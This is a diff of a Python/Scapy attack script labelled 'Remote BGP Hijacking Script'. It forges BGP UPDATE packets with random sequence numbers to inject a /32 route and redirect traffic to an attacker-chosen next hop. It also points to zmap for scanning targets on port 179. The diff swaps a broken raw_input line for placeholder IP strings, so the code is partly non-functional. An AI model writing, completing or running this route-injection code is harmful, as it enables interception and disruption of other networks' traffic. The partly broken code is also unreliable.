@@ -5,8 +5,6 @@ from scapy.all import *
 import sys
 load_contrib('bgp')
 
-redirect = raw_input())
-
 print "Remote BGP Hijacking Script\n"
 print "Made by Vertrix\n"
 print "To scan a target/range use zmap ip/24 -p 179 \n"
@@ -21,7 +19,7 @@ for i in range(1, 3):
 
     setORIGIN=BGPPathAttr(type_flags="Transitive", type_code="ORIGIN", attribute=[BGPPAOrigin(origin="IGP")])
     setAS=BGPPathAttr(type_flags="Transitive", type_code="AS_PATH", attribute=None)
-    setNEXTHOP=BGPPathAttr(type_flags="Transitive", type_code="NEXT_HOP", attribute=[BGPPANextHop(next_hop=redirect)])
+    setNEXTHOP=BGPPathAttr(type_flags="Transitive", type_code="NEXT_HOP", attribute=[BGPPANextHop(next_hop="change to ip you want to redirect the traffic to")])
     setMED=BGPPathAttr(type_flags="Optional", type_code="MULTI_EXIT_DISC", attribute=[BGPPAMultiExitDisc(med=0)])
     setLOCALPREF=BGPPathAttr(type_flags="Transitive", type_code="LOCAL_PREF", attribute=[BGPPALocalPref(local_pref=100)]) 
 
@@ -29,7 +27,7 @@ for i in range(1, 3):
         /TCP(dport=179, sport=179, flags='PA', seq=RandShort(), ack=RandShort())\
         /BGPHeader(marker=340282366920938463463374607431768211455, type="UPDATE")\
         /BGPUpdate(withdrawn_routes_len=0, \
-        path_attr=[setORIGIN, setAS, setNEXTHOP, setMED, setLOCALPREF], nlri=[BGPNLRI_IPv4(prefix=redirect + "/32")])
+        path_attr=[setORIGIN, setAS, setNEXTHOP, setMED, setLOCALPREF], nlri=[BGPNLRI_IPv4(prefix="change to ip you want to redirect the traffic to/32")])
 
 
     del bgp_update[BGPHeader].len
